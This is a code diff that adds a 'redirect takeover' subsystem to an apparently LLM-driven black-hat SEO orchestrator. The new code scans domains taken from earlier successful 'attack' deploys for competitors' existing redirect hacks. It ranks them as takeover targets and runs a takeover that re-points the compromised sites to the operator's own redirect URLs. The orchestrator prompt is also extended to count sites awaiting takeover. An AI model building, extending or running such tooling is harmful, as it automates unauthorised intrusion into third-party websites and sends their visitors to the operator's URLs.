@@ -37,6 +37,7 @@ import {
   autonomousDeploys,
   type AiOrchestratorStateRow,
   type AiTaskQueueRow,
+  hackedSiteDetections,
 } from "../drizzle/schema";
 import { eq, desc, sql, and, gte, lte, count, isNull, or } from "drizzle-orm";
 import {
@@ -98,6 +99,12 @@ export interface WorldState {
     running: number;
     completedToday: number;
     failedToday: number;
+  };
+  hackedSites: {
+    totalDetected: number;
+    awaitingTakeover: number;
+    takenOver: number;
+    highPriority: number;
   };
 }
 
@@ -268,6 +275,17 @@ async function observe(): Promise<WorldState> {
     return sum + (parseFloat(String(r.totalBudget)) - parseFloat(String(r.spent)));
   }, 0);
 
+  // Hacked Sites Detection stats
+  const allHackedSites = await (await getDb())!.select({
+    isHacked: hackedSiteDetections.isHacked,
+    takeoverStatus: hackedSiteDetections.takeoverStatus,
+    priority: hackedSiteDetections.priority,
+  }).from(hackedSiteDetections);
+  const hackedOnly = allHackedSites.filter(s => s.isHacked);
+  const awaitingTakeover = hackedOnly.filter(s => s.takeoverStatus === "not_attempted");
+  const takenOver = hackedOnly.filter(s => s.takeoverStatus === "success");
+  const highPriority = hackedOnly.filter(s => s.priority >= 8);
+
   // Task queue stats
   const [queuedTasks] = await (await getDb())!.select({ count: count() })
     .from(aiTaskQueue).where(eq(aiTaskQueue.status, "queued"));
@@ -328,6 +346,12 @@ async function observe(): Promise<WorldState> {
       running: runningTasks?.count || 0,
       completedToday: completedToday?.count || 0,
       failedToday: failedToday?.count || 0,
+    },
+    hackedSites: {
+      totalDetected: hackedOnly.length,
+      awaitingTakeover: awaitingTakeover.length,
+      takenOver: takenOver.length,
+      highPriority: highPriority.length,
     },
   };
 }
@@ -399,6 +423,7 @@ async function decide(
   const enabledSystems: string[] = [];
   if (orchState.seoEnabled) enabledSystems.push("seo");
   if (orchState.attackEnabled) enabledSystems.push("attack");
+  if (orchState.attackEnabled) enabledSystems.push("redirect_takeover"); // Auto-enable with attack
   if (orchState.pbnEnabled) enabledSystems.push("pbn");
   if (orchState.discoveryEnabled) enabledSystems.push("discovery");
   if (orchState.rankTrackingEnabled) enabledSystems.push("rank");
@@ -411,6 +436,7 @@ async function decide(
     discovery: ["discovery_search", "discovery_score", "discovery_queue_attack"],
     rank: ["rank_check", "rank_bulk_check", "rank_competitor_analysis"],
     autobid: ["autobid_scan", "autobid_analyze", "autobid_execute"],
+    redirect_takeover: ["takeover_scan_targets", "takeover_batch_scan", "takeover_execute", "takeover_scan_serp_targets"],
   };
 
   const prompt = `You are the Master AI Orchestrator. Based on your analysis, decide what actions to take.
@@ -424,6 +450,7 @@ WORLD STATE SUMMARY:
 - Rank: ${worldState.rank.improved} improved, ${worldState.rank.declined} declined
 - Tasks: ${worldState.tasks.queued} queued, ${worldState.tasks.running} running
 - Attack: ${worldState.attack.successfulDeploys} successful deploys
+- Hacked Sites: ${worldState.hackedSites.totalDetected} detected, ${worldState.hackedSites.awaitingTakeover} awaiting takeover, ${worldState.hackedSites.highPriority} high-priority
 
 ENABLED SUBSYSTEMS: ${enabledSystems.join(", ")}
 REMAINING ACTIONS TODAY: ${remainingActions}
@@ -731,6 +758,123 @@ async function executeTask(task: AiTaskQueueRow): Promise<Record<string, unknown
 
     // ─── Auto-Bid Tasks ───
     if (subsystem === "autobid" || taskType.startsWith("autobid_")) {
+      return { action: taskType, status: "dispatched" };
+    }
+
+    // ─── Redirect Takeover Tasks ───
+    if (subsystem === "redirect_takeover" || taskType.startsWith("takeover_")) {
+      const { detectExistingRedirects, executeRedirectTakeover } = await import("./redirect-takeover");
+      
+      if (taskType === "takeover_scan_targets" || taskType === "takeover_batch_scan" || taskType === "takeover_scan_serp_targets") {
+        // Scan SERP-discovered targets for existing hacks
+        const db = (await getDb())!;
+        const targets = await db.select({
+          id: hackedSiteDetections.id,
+          domain: hackedSiteDetections.domain,
+          url: hackedSiteDetections.url,
+        }).from(hackedSiteDetections)
+          .where(eq(hackedSiteDetections.takeoverStatus, "not_attempted"))
+          .limit(10);
+        
+        if (targets.length === 0) {
+          // Try to discover new hacked sites from SERP targets
+          const serpTargets = await db.select({
+            domain: deployHistory.targetDomain,
+          }).from(deployHistory)
+            .where(eq(deployHistory.status, "success"))
+            .orderBy(desc(deployHistory.createdAt))
+            .limit(20);
+          
+          let scanned = 0;
+          for (const t of serpTargets) {
+            if (!t.domain) continue;
+            try {
+              const detection = await detectExistingRedirects(`https://${t.domain}`);
+              if (detection.detected && detection.methods.length > 0) {
+                await db.insert(hackedSiteDetections).values({
+                  domain: t.domain,
+                  url: `https://${t.domain}`,
+                  isHacked: true,
+                  competitorUrl: detection.competitorUrl,
+                  detectionMethods: detection.methods.map(m => ({
+                    type: m.type, location: m.location, competitorUrl: m.competitorUrl,
+                    confidence: m.confidence, details: m.details, rawSnippet: m.rawSnippet,
+                  })),
+                  targetPlatform: detection.targetPlatform,
+                  wpVersion: detection.wpVersion,
+                  plugins: detection.plugins,
+                  priority: detection.methods.some(m => m.confidence === "high") ? 10 : 5,
+                  takeoverStatus: "not_attempted",
+                  source: "agentic_discovery",
+                }).onDuplicateKeyUpdate({ set: {
+                  isHacked: true,
+                  competitorUrl: detection.competitorUrl,
+                  detectionMethods: detection.methods.map(m => ({
+                    type: m.type, location: m.location, competitorUrl: m.competitorUrl,
+                    confidence: m.confidence, details: m.details, rawSnippet: m.rawSnippet,
+                  })),
+                  scannedAt: new Date(),
+                }});
+                scanned++;
+              }
+            } catch {}
+          }
+          return { action: taskType, status: "completed", scannedDomains: serpTargets.length, newHackedFound: scanned };
+        }
+        
+        let scanned = 0;
+        for (const t of targets) {
+          try {
+            const detection = await detectExistingRedirects(t.url);
+            await db.update(hackedSiteDetections).set({
+              isHacked: detection.detected && detection.methods.length > 0,
+              competitorUrl: detection.competitorUrl,
+              detectionMethods: detection.methods.map(m => ({
+                type: m.type, location: m.location, competitorUrl: m.competitorUrl,
+                confidence: m.confidence, details: m.details, rawSnippet: m.rawSnippet,
+              })),
+              targetPlatform: detection.targetPlatform,
+              wpVersion: detection.wpVersion,
+              plugins: detection.plugins,
+              scannedAt: new Date(),
+            }).where(eq(hackedSiteDetections.id, t.id));
+            scanned++;
+          } catch {}
+        }
+        return { action: taskType, status: "completed", scanned };
+      }
+      
+      if (taskType === "takeover_execute" && targetDomain) {
+        const detection = await detectExistingRedirects(`https://${targetDomain}`);
+        if (!detection.detected || detection.methods.length === 0) {
+          return { action: taskType, status: "skipped", reason: "Site not detected as hacked" };
+        }
+        // Get redirect URL from pool
+        const db2 = (await getDb())!;
+        const { redirectUrlPool } = await import("../drizzle/schema");
+        const redirectUrls = await db2.select({ url: redirectUrlPool.url })
+          .from(redirectUrlPool)
+          .where(eq(redirectUrlPool.isActive, true))
+          .limit(1);
+        const ourRedirectUrl = redirectUrls.length > 0 ? redirectUrls[0].url : `https://${targetDomain}`;
+        
+        const results = await executeRedirectTakeover({
+          targetUrl: `https://${targetDomain}`,
+          ourRedirectUrl,
+        });
+        const anySuccess = results.some(r => r.success);
+        const successMethod = results.find(r => r.success)?.method || "none";
+        // Update DB
+        const db = (await getDb())!;
+        await db.update(hackedSiteDetections).set({
+          takeoverStatus: anySuccess ? "success" : "failed",
+          takeoverMethod: successMethod,
+          takeoverResult: JSON.stringify(results),
+          takeoverAt: new Date(),
+        }).where(eq(hackedSiteDetections.domain, targetDomain));
+        return { action: taskType, status: anySuccess ? "completed" : "failed", method: successMethod, results: results.length };
+      }
+      
       return { action: taskType, status: "dispatched" };
     }
 
